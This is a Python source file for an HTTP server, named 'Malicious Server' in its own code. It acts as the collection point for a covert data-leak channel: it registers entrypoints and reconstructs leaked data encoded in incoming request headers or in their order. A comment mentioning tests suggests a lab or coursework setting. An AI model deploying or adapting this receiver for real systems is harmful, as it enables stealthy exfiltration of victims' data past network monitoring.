import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

from modules.dedicated_header import DedicatedHeaderExtractor
from modules.headers_order import HeadersOrderExtractor

#    ----   SERVER CONFIGURATION   ----    #

#Server state memory
configs = {}
leaked_data = {}
bit_buffers = {}
is_terminated = {}

EXTRACTORS = {
    "dedicatedheader": DedicatedHeaderExtractor(),
    "headersorder": HeadersOrderExtractor()
}

#   ----   SERVER FUNCTIONING   ----    #

class MaliciousServerHandler(BaseHTTPRequestHandler):

    # Handling request per type

    #Post is used for setup, it receives the entrypoint and the type of leak to be extracted
    # and prepares the server to handle future requests to that entrypoint accordingly.
    def do_POST(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/setup':
            # Prepare setup
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            entrypoint = "/" + data.get('entrypoint', '').lstrip('/')
            leak_type = data.get('type', '')

            if leak_type not in EXTRACTORS:
                #In case of invalid leak type
                self.send_response(400)
                self.end_headers()
                return

            configs[entrypoint] = leak_type
            leaked_data[entrypoint] = ""
            bit_buffers[entrypoint] = ""
            is_terminated[entrypoint] = False

            #Sending response
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "setup complete"}')
        else:
            self.send_response(404)
            self.end_headers()
        
        

    #Get is used to retrieve the leaked data for a specific entrypoint, if available.
    def do_GET(self):
        parsed_path = urlparse(self.path)
        entrypoint = parsed_path.path

        if entrypoint in configs and entrypoint in leaked_data:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(leaked_data[entrypoint].encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    #PUT is used to submit data for a specific entrypoint, triggering the extraction process.
    def do_PUT(self):
        parsed_path = urlparse(self.path)
        entrypoint = parsed_path.path

        if entrypoint not in configs:
            self.send_response(404)
            self.end_headers()
            return

        leak_type = configs[entrypoint]
        extractor = EXTRACTORS.get(leak_type)
        
        if extractor:
            extractor.extract(self.headers, entrypoint, leaked_data, bit_buffers, is_terminated)
            
        self.send_response(200)
        self.end_headers()
    
    #DELETE is used to clear the server's in-memory state.
    #Not requested but useful to clean up before the tests without restarting the server.
    def do_DELETE(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/clear':
            configs.clear()
            leaked_data.clear()
            bit_buffers.clear()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "cache cleared"}')
        else:
            self.send_response(404)
            self.end_headers()

#    ----   SERVER RUNNER   ----    #

def run(server_class=HTTPServer, handler_class=MaliciousServerHandler, port=8001):
    # Just setting up server to listen on all interfaces and the specified port
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Malicious Server listening on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()